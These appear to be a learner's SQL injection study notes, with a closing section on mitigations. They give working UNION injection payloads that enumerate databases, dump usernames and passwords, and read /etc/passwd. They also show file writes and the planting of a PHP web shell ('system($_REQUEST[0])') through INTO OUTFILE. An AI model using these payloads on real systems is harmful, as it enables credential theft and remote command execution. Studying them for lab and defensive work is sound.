## MySQL Fingerprinting

If webserver apache or nginx (aka linux) most likely DBMS is MySql
If IIS most likely MSSQL

|Payload|When to Use|Expected Output|Wrong Output|
|---|---|---|---|
|`SELECT @@version`|When we have full query output|MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'|In MSSQL it returns MSSQL version. Error with other DBMS.|
|`SELECT POW(1,1)`|When we only have numeric output|`1`|Error with other DBMS|
|`SELECT SLEEP(5)`|Blind/No Output|Delays page response for 5 seconds and returns `0`.|Will not delay response with other DBMS|
## INFORMATION_SCHEMA Database

to pull data with union select we need the following info:

- List of databases
- List of tables within each database
- List of columns within each table

The [INFORMATION_SCHEMA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html) database contains metadata about the databases and tables present on the server.

```sql
SELECT * FROM my_database.users;
```

## SCHEMATA

```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```
Now, let's do the same using a `UNION` SQL injection, with the following payload:

```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- 
```

 We can find the current database with the `SELECT database()` query.
```sql
cn' UNION select 1,database(),2,3-- -
```

## TABLES

The [TABLES](https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html) table contains information about all tables throughout the database

- TABLE_SCHEMA
- TABLE_NAME
```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

## COLUMNS
The [COLUMNS](https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html) table contains information about all columns present in all the databases.
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

The table has two columns named `username` and `password`. We can use this information and dump data from the table.

## Data

Now that we have all the information, we can form our `UNION` query to dump data of the `username` and `password` columns from the `credentials` table in the `dev` database.
```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```


# Reading Files


## Privileges


For example, in `MySQL`, the DB user must have the `FILE` privilege to load a file's content into a table and then dump data from that table and read files


```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```
or
```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

#### User Privileges

```sql
SELECT super_priv FROM mysql.user
```
injection :
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

If we had many users within the DBMS, we can add `WHERE user="root"` to only show privileges for our current user `root`:


```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

we can also dump other privs:

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```
to get it for a certain user:

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

![[Pasted image 20250217101506.png]]

## LOAD_FILE

The [LOAD_FILE()](https://mariadb.com/kb/en/load_file/) function can be used in MariaDB / MySQL to read data from files.

```sql
SELECT LOAD_FILE('/etc/passwd');
```

Note: We will only be able to read the file if the OS user running MySQL has enough privileges to read it.

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

## Another Example

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```


# Writing Files

## Write File Privileges

1. User with `FILE` privilege enabled
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server

#### secure_file_priv

 An empty value lets us read files from the entire file system.

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```
`MySQL` global variables are stored in a table called [global_variables](https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html)

	- variable_name
	- variable_value


```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

## SELECT INTO OUTFILE

```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

>[!tip]
>Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.

## Writing Files through SQL Injection

```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```

>[!note]
>**Note:** To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.

The `UNION` injection payload would be as follows:

```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```


## Writing a Web Shell

```php
<?php system($_REQUEST[0]); ?>
```

inject it usinq sqli:

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

 This can be verified by browsing to the `/shell.php` file and executing commands via the `0` parameter, with `?0=id` in our URL:
 ![[Pasted image 20250217104749.png]]

# Mitigating SQL Injection

## Input Sanitization

```php
<SNIP>
  $username = $_POST['username'];
  $password = $_POST['password'];

  $query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
  echo "Executing query: " . $query . "<br /><br />";

  if (!mysqli_query($conn ,$query))
  {
          die('Error: ' . mysqli_error($conn));
  }

  $result = mysqli_query($conn, $query);
  $row = mysqli_fetch_array($result);
<SNIP>
```

 Libraries provide multiple functions to achieve this, one such example is the [mysqli_real_escape_string()](https://www.php.net/manual/en/mysqli.real-escape-string.php) function. This function escapes characters such as `'` and `"`, so they don't hold any special meaning.
```php
$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = mysqli_real_escape_string($conn, $_POST['password']);

$query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
echo "Executing query: " . $query . "<br /><br />";
```

. A similar example is the [pg_escape_string()](https://www.php.net/manual/en/function.pg-escape-string.php) which used to escape PostgreSQL queries.

## Input Validation

```php
<?php
if (isset($_GET["port_code"])) {
	$q = "Select * from ports where port_code ilike '%" . $_GET["port_code"] . "%'";
	$result = pg_query($conn,$q);
    
	if (!$result)
	{
   		die("</table></div><p style='font-size: 15px;'>" . pg_last_error($conn). "</p>");
	}
<SNIP>
?>
```

A regular expression can be used for validating the input:
```php
$pattern = "/^[A-Za-z\s]+$/";
$code = $_GET["port_code"];

if(!preg_match($pattern, $code)) {
  die("</table></div><p style='font-size: 15px;'>Invalid input! Please try again.</p>");
}

$q = "Select * from ports where port_code ilike '%" . $code . "%'";
```


## User Privileges

We should ensure that the user querying the database only has minimum permissions.

## Web Application Firewall

WAFs can be open-source (ModSecurity) or premium (Cloudflare).

## Parameterized Queries


